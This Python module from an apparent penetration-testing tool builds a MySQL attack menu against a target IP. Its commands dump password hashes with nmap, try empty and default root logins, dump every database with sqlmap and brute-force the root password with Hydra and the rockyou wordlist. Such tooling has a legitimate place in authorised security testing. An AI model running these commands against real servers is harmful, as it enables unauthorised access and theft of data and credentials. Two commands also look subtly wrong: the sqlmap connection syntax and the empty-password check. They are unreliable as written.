from Modules.Imports.protocol_imports import *

def mysql_submenu(target_ip, open_ports):
    actions = {
        "1": {"description": "Enumerate MySQL with Nmap", "function": run_nmap_mysql_scripts},
        "2": {"description": "Check for Empty Passwords", "function": check_empty_passwords},
        "3": {"description": "Enumerate Databases and Users with mysql-client", "function": enumerate_mysql_databases_users},
        "4": {"description": "Test Default Credentials", "function": test_default_credentials},
        "5": {"description": "Perform SQL Dump with sqlmap", "function": run_sqlmap},
        "6": {"description": "Brute-Force MySQL with Hydra", "function": run_hydra_mysql},
        "7": {"description": "HackTricks Reference", "function": show_hacktricks_reference},
    }
    build_submenu("MySQL Enumeration", target_ip, actions, open_ports)

def run_nmap_mysql_scripts(target_ip, open_ports):
    title = "Nmap MySQL Scripts"
    content = (
        f"nmap -sV -Pn -vv {target_ip} -p 3306 --script "
        f"mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,"
        f"mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122"
    )
    run_command(title, content, target_ip, open_ports)

def check_empty_passwords(target_ip, open_ports):
    title = "Check Empty Passwords"
    content = f"mysql -h {target_ip} -u root -p ''"
    run_command(title, content, target_ip, open_ports)

def enumerate_mysql_databases_users(target_ip, open_ports):
    title = "MySQL Databases and Users Enumeration"
    content = (
        f"mysql -h {target_ip} -u root -p\n"
        f"> SHOW DATABASES;\n"
        f"> SELECT User, Host FROM mysql.user;"
    )
    run_command(title, content, target_ip, open_ports)

def test_default_credentials(target_ip, open_ports):
    title = "Test Default Credentials"
    content = (
        f"Common Default Credentials to Test:\n\n"
        f"Username: root, Password: root\n"
        f"Username: admin, Password: admin\n"
        f"Username: user, Password: password\n\n"
        f"Command: mysql -h {target_ip} -u USERNAME -pPASSWORD"
    )
    run_command(title, content, target_ip, open_ports)

def run_sqlmap(target_ip, open_ports):
    title = "SQL Dump with sqlmap"
    content = f"sqlmap -u 'mysql://root@{target_ip}' --dump-all"
    run_command(title, content, target_ip, open_ports)

def run_hydra_mysql(target_ip, open_ports):
    title = "Hydra MySQL Brute-Force"
    content = f"hydra -l root -P /usr/share/wordlists/rockyou.txt {target_ip} mysql"
    run_command(title, content, target_ip, open_ports)

def show_hacktricks_reference(target_ip, open_ports):
    title = "HackTricks Reference"
    content = (
        f"Visit the following link for more MySQL enumeration tips:\n\n"
        f"https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql"
    )
    run_command(title, content, target_ip, open_ports)
